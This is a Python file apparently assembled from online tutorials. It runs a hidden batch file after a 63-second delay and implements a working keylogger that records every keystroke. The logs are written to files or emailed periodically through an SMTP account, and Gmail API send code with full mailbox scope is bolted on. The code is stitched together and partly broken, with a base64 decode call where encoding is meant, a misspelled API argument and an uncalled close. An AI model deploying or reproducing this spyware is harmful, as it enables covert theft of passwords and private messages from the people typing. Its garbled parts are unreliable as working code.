import time
import os

# file1 = open("TestPurpose.bat", "r")

# read_content = file1.read()
# print(read_content)

time.sleep(63)

os.system("TestPurpose.bat")

# Source: #https://www.thepythoncode.com/article/write-a-keylogger-python, https://www.thepythoncode.com/article/use-gmail-api-in-python


# Importing tool that will be used for keyboard log setup
import keyboard
# smtplib - Simple Mail Transfer Protocol. Granting access to an SMTP server, sends emails with text or HTML content, and handle errors that may occur during the process
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# interacts with the operating system
import os
import pickle
import inspect
import time

# Gmail API Utilities
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

# For encoding/decoding messages in base64
from base64 import urlsafe_b64decode, urlsafe_b64encode

# For dealing with attachment MIME types
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from mimetypes import guess_type as guess_mime_type

# For every set duration the following key logs will be reported
SEND_REPORT_EVERY = 60

# Whatever email and password that is provided here will be used to receive information from keylogger
EMAIL_ADDRESS = ''
EMAIL_PASSWORD = ''

class Keylogger:
    def __init__(self, interval, report_method = "file"):
        # We are gonna pass SEND_REPORT_EVERY to invertal
        self.interval = interval
        self.report_method = report_method

        # This is the string variable that contains the log of all the keystrokes within "self.interval"
        self.log = ""

        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # Whenever a key is released, the button pressed is appended to the self.log string variable
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = ' '
            elif name == 'enter':
                name = "[ENTER]\n"
            elif name == 'decimal':
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        # add the key name to our global 'self.log' variable
        self.log += name
    
    def update_filename(self):
        # Constructing the filename to be identified by start and end datetimes

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f'keylog-{start_dt_str}_{end_dt_str}'
    
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file = f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"

        html = f"<p>{message}<p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        
        # Convert back as string(as_string()) message after making the mail
        return msg.as_string()
    
    def sendmail(self, email, password, message, verbose = 1):
        # Manages a connection to an SMTP server; example -> Microsoft365 and Outlook
        server = smtplib.SMTP(host = "smtp.office365.com", port = 587)

        # Connect to the  SMTP server as TLS mode (for security)
        server.starttls()

        # Login to the email account
        server.login(email, password)

        # After preperation, send the actual message
        server.sendmail(email, email, self.prepare_mail(message))

        # Terminate the sesstion
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Send an email to {email} containing: {message}")

    def report(self):
        if self.log:

            self.end_dt = datetime.now()

            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            # Comment below line if you dont want to print in the console
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval = self.interval, function = self.report)

        # Set the thread as daemon (dies when main thread die)
        timer.daemon = True

        # Start timer
        timer.start()

    def start(self):

        # record the start datetime
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback = self.callback)

        # Start reporting the keylog
        self.report()

        # Make a simple message
        print(f"{datetime.now()} - Keylogger active")

        # Block the current thread, wait until CTRL + C is pressed
        keyboard.wait()

# Request all access (permission to read/send/receive emails, manage the inbox, and more)
SCOPES = ['https://mail.google.com/']
our_mail = '[#Insert personal email or work email]'

def gmail_authenticate():
    creds = None
    # Token.pickle = stores the user's access and refresh token, and is created automatically when the authorization flow completes for the first time

    if os.path.exists("token.pickle"):
        with open("token.pickle", "rb") as token:
            creds = pickle.load(token)

    # If there are no valid credentials available, let the user log in
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port = 0)

            # save the credentials for the next run
            with open("token.pickle", "wb") as token:
                pickle.dump(creds, token)
    return build("gmail", "v1", credentials = creds)

# Get the Gmail API service
service = gmail_authenticate()

# Adds the attachment with the given filename to the given message
def add_attachment(message, filename):
    content_type, encoding = guess_mime_type(filename)
    if content_type is None or encoding is not None:
        content_type = 'application/octet-stream'

    main_type, sub_type = content_type.split("/", 1)
    if main_type == 'type':
        fp = open(filename, 'rb')
        msg = MIMEText(fp.read().decode(), _subtype = sub_type)
        fp.close()
    elif main_type == 'image':
        fp = open(filename, 'rb')
        msg = MIMEImage(fp.read(), _subtype = sub_type)
        fp.close()
    elif main_type == 'audio':
        fp = open(filename, 'rb')
        msg = MIMEAudio(fp.read(), _subtype = sub_type)
        fp.close
    filename = os.path.basename(filename)
    msg.add_header('Content-Disposition', 'attachment', filename = filename)
    message.attach(msg)

# Writes the function that takes some message parameters, builds, and returns an email message
def build_message(destination, obj, body, attachments = []):
    if not attachments:
        message = MIMEText(body)
        message['to'] = destination
        message['from'] = our_mail
        message['subject'] = obj
    else:
        message = MIMEMultipart()
        message['to'] = destination
        message['from'] = our_mail
        message['subject'] = obj
        message.attach(MIMEText(body))
        for filename in attachments:
            add_attachment(message, filename)
    return {'raw': urlsafe_b64decode(message.as_bytes()).decode()}

# Takes message parameters, and uses the Google mail API to send a message constructed with the previous defined function.
def send_message(service, destination, obj, body, attachments = []):
    return service.users().messages().send(
        userID = 'me',
        body = build_message(destination, obj, body, attachments)
    ).execute()

send_message(service, '[#insert personal email]', "What's up doc(Subject)", "Bugs Bunny is one of my favorite looney characters")


if __name__ == "__main__":
    keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method = "file")
    keylogger.start()

